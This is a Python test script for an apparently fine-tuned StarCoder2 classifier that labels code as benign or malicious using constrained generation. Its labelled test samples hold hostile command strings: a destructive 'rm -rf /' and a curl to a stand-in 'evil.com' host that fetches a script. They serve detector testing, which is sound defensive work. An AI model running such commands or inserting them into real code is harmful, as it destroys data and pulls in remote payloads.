"""
Quick test script to validate the new constrained generation approach.
Tests with hardcoded examples to ensure the prompt format and constrained generation work.
"""
import torch
from transformers import AutoTokenizer, AutoModelForCausalLM, LogitsProcessor
from peft import PeftModel
from scriptguard.utils.prompts import format_inference_prompt, format_fewshot_prompt
from scriptguard.utils.logger import logger


class StrictBinaryClassificationProcessor(LogitsProcessor):
    """
    Strict constrained generation: ONLY allow BENIGN or MALICIOUS as first token.
    After first token, allow natural completion.
    """
    def __init__(self, benign_token_id: int, malicious_token_id: int, prompt_length: int):
        self.benign_token_id = benign_token_id
        self.malicious_token_id = malicious_token_id
        self.prompt_length = prompt_length

    def __call__(self, input_ids: torch.LongTensor, scores: torch.FloatTensor) -> torch.FloatTensor:
        # Only constrain the FIRST generated token
        current_length = input_ids.shape[1]
        if current_length > self.prompt_length:
            # After first token, allow natural completion
            return scores

        # For first token: Create a mask with -inf for all tokens except valid ones
        mask = torch.full_like(scores, float('-inf'))

        # Set valid tokens to original scores (or boost them slightly)
        mask[:, self.benign_token_id] = scores[:, self.benign_token_id] + 5.0
        mask[:, self.malicious_token_id] = scores[:, self.malicious_token_id] + 5.0

        return mask

# Hardcoded test samples
TEST_SAMPLES = [
    {
        "code": "import os\nos.system('rm -rf /')",
        "label": 1,  # malicious
        "description": "Destructive system command"
    },
    {
        "code": "def add(a, b):\n    return a + b\nresult = add(2, 3)",
        "label": 0,  # benign
        "description": "Simple addition function"
    },
    {
        "code": "import subprocess\nsubprocess.call(['curl', 'http://evil.com/malware.sh'])",
        "label": 1,  # malicious
        "description": "Downloads and executes remote script"
    },
    {
        "code": "print('Hello, World!')",
        "label": 0,  # benign
        "description": "Hello world"
    }
]

def test_prompt_format():
    """Test that the new prompt format looks correct."""
    logger.info("=" * 60)
    logger.info("TESTING PROMPT FORMAT")
    logger.info("=" * 60)

    sample_code = "import os\nos.system('whoami')"

    # Test inference prompt
    prompt = format_inference_prompt(sample_code, max_code_length=200)
    logger.info("Inference Prompt:")
    logger.info(prompt)
    logger.info("")

    # Test few-shot prompt
    context_examples = [
        {"code": "import subprocess\nsubprocess.call('rm -rf /')", "label": "malicious"},
        {"code": "def hello():\n    print('hi')", "label": "benign"}
    ]
    fewshot_prompt = format_fewshot_prompt(sample_code, context_examples, max_code_length=200)
    logger.info("Few-Shot Prompt:")
    logger.info(fewshot_prompt)
    logger.info("=" * 60)
    logger.info("")

def test_token_encoding():
    """Test token encoding for BENIGN and MALICIOUS."""
    logger.info("=" * 60)
    logger.info("TESTING TOKEN ENCODING")
    logger.info("=" * 60)

    model_id = "bigcode/starcoder2-3b"
    tokenizer = AutoTokenizer.from_pretrained(model_id)

    # Test different variations
    test_words = [
        " BENIGN",
        " MALICIOUS",
        "BENIGN",
        "MALICIOUS",
        " benign",
        " malicious"
    ]

    for word in test_words:
        tokens = tokenizer.encode(word, add_special_tokens=False)
        decoded = [tokenizer.decode([t]) for t in tokens]
        logger.info(f"'{word}' -> tokens: {tokens}, decoded: {decoded}")

    logger.info("=" * 60)
    logger.info("")

def test_constrained_generation():
    """Test constrained generation with the actual model."""
    logger.info("=" * 60)
    logger.info("TESTING CONSTRAINED GENERATION")
    logger.info("=" * 60)

    model_id = "bigcode/starcoder2-3b"
    adapter_path = "models/scriptguard-model/final_adapter"

    # Check if adapter exists
    import os
    if not os.path.exists(adapter_path):
        # Try to find latest checkpoint
        from pathlib import Path
        checkpoints_dir = Path("models/scriptguard-model")
        checkpoints = list(checkpoints_dir.glob("checkpoint-*"))
        if checkpoints:
            adapter_path = str(max(checkpoints, key=lambda p: int(p.name.split("-")[1])))
            logger.info(f"Using checkpoint: {adapter_path}")
        else:
            logger.error("No trained model found. Please train first.")
            return

    # Load model
    logger.info(f"Loading model: {model_id}")
    tokenizer = AutoTokenizer.from_pretrained(model_id)
    if tokenizer.pad_token is None:
        tokenizer.pad_token = tokenizer.eos_token

    device = "cuda" if torch.cuda.is_available() else "cpu"
    logger.info(f"Using device: {device}")

    try:
        if device == "cuda":
            base_model = AutoModelForCausalLM.from_pretrained(
                model_id,
                torch_dtype=torch.float16,
                low_cpu_mem_usage=True,
            )
            base_model = base_model.to(device)
        else:
            base_model = AutoModelForCausalLM.from_pretrained(
                model_id,
                torch_dtype=torch.float32,
                low_cpu_mem_usage=True
            )
            base_model = base_model.to("cpu")

        logger.info(f"Loading adapter: {adapter_path}")
        model = PeftModel.from_pretrained(base_model, adapter_path)
        model.eval()

        # Get token IDs for constrained generation
        benign_tokens = tokenizer.encode(" BENIGN", add_special_tokens=False)
        malicious_tokens = tokenizer.encode(" MALICIOUS", add_special_tokens=False)

        logger.info(f"BENIGN tokens: {benign_tokens}")
        logger.info(f"MALICIOUS tokens: {malicious_tokens}")

        benign_token_id = benign_tokens[0] if benign_tokens else None
        malicious_token_id = malicious_tokens[0] if malicious_tokens else None

        if benign_token_id is None or malicious_token_id is None:
            logger.error("Failed to get token IDs!")
            return

        logger.info(f"Token IDs: BENIGN={benign_token_id}, MALICIOUS={malicious_token_id}")
        logger.info("")

        # Test on hardcoded samples
        correct = 0
        total = 0

        for i, sample in enumerate(TEST_SAMPLES):
            logger.info(f"Sample {i+1}: {sample['description']}")
            logger.info(f"Code: {sample['code'][:50]}...")
            logger.info(f"True label: {'MALICIOUS' if sample['label'] == 1 else 'BENIGN'}")

            # Create prompt
            prompt = format_inference_prompt(sample['code'], max_code_length=200)

            # Tokenize
            inputs = tokenizer(prompt, return_tensors="pt", truncation=True, max_length=512)
            inputs = {k: v.to(model.device) for k, v in inputs.items()}

            prompt_length = inputs['input_ids'].shape[1]

            # Create constraint processor for this generation
            constraint_processor = StrictBinaryClassificationProcessor(
                benign_token_id=benign_token_id,
                malicious_token_id=malicious_token_id,
                prompt_length=prompt_length
            )

            # Generate with constraints - allow up to 5 tokens to complete the word
            with torch.no_grad():
                outputs = model.generate(
                    **inputs,
                    max_new_tokens=5,  # Allow full word completion (MALICIOUS = 4 tokens, BENIGN = 3 tokens)
                    do_sample=False,
                    num_beams=1,
                    pad_token_id=tokenizer.pad_token_id,
                    eos_token_id=tokenizer.eos_token_id,
                    logits_processor=[constraint_processor]
                )

            # Decode only the new tokens
            prompt_length_tokens = inputs['input_ids'].shape[1]
            generated_token_ids = outputs[0][prompt_length_tokens:]
            generated_text = tokenizer.decode(generated_token_ids, skip_special_tokens=True).strip()

            # Predict - check if the generated text starts with MALICIOUS or BENIGN
            generated_upper = generated_text.upper()
            if "MALICIOUS" in generated_upper:
                predicted_label = 1
            elif "BENIGN" in generated_upper:
                predicted_label = 0
            else:
                # Fallback: check first character
                predicted_label = 1 if generated_upper.startswith("M") else 0

            logger.info(f"Generated: '{generated_text}' -> Predicted: {'MALICIOUS' if predicted_label == 1 else 'BENIGN'}")

            if predicted_label == sample['label']:
                logger.info("✓ CORRECT")
                correct += 1
            else:
                logger.error("✗ WRONG")

            total += 1
            logger.info("")

        accuracy = correct / total if total > 0 else 0
        logger.info("=" * 60)
        logger.info(f"RESULTS: {correct}/{total} correct ({accuracy*100:.1f}% accuracy)")
        logger.info("=" * 60)

    except Exception as e:
        logger.error("Error during testing:")
        logger.error(str(e))
        import traceback
        logger.error(traceback.format_exc())

def main():
    """Run all tests."""
    test_prompt_format()
    test_token_encoding()
    test_constrained_generation()

if __name__ == "__main__":
    main()
